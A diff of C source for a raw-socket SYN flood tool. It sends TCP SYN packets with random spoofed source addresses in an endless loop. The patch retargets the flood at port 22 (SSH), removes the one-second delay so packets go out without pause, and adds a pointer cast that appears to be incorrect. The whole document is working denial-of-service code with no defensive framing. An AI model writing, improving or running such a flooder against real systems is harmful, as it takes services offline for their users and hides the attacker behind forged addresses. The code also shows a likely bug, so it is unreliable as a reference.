@@ -1,5 +1,6 @@
 #include <sys/socket.h> 
-#include <string.h>
+#include <sys/types.h>
+#include <strings.h>
 #include <netinet/in.h> 
 #include <netinet/ip.h> 
 #include <netinet/tcp.h> 
@@ -8,7 +9,7 @@
 #include <unistd.h> 
 #include <stdio.h> 
 #include <netdb.h>
-#define DESTPORT 2288
+#define DESTPORT 22
 #define LOCALPORT 8888   
 void send_tcp(int sockfd,struct sockaddr_in *addr); 
 unsigned short check_sum(unsigned short *addr,int len);
@@ -46,10 +47,9 @@ int main(int argc,char **argv)
         setuid(getpid());
         send_tcp(sockfd,&addr); 
 }
-
 void send_tcp(int sockfd,struct sockaddr_in *addr) 
 { 
-        char buffer[100]; 
+         char buffer[100]; 
         struct ip *ip; 
         struct tcphdr *tcp; 
         int head_len;
@@ -74,13 +74,13 @@ void send_tcp(int sockfd,struct sockaddr_in *addr)
         tcp->doff=5; 
         tcp->syn=1; 
         tcp->check=0;
+
         while(1) 
         { 
                 ip->ip_src.s_addr=random();  
                 tcp->check=check_sum((unsigned short *)tcp, 
                                 sizeof(struct tcphdr)); 
-                sendto(sockfd,buffer,head_len,0,addr,sizeof(struct sockaddr_in)); 
-        sleep(1);
+                sendto(sockfd,buffer,head_len,0,(struct sockaddr*) &addr,sizeof(struct sockaddr_in)); 
         } 
 }
 unsigned short check_sum(unsigned short *addr,int len) 
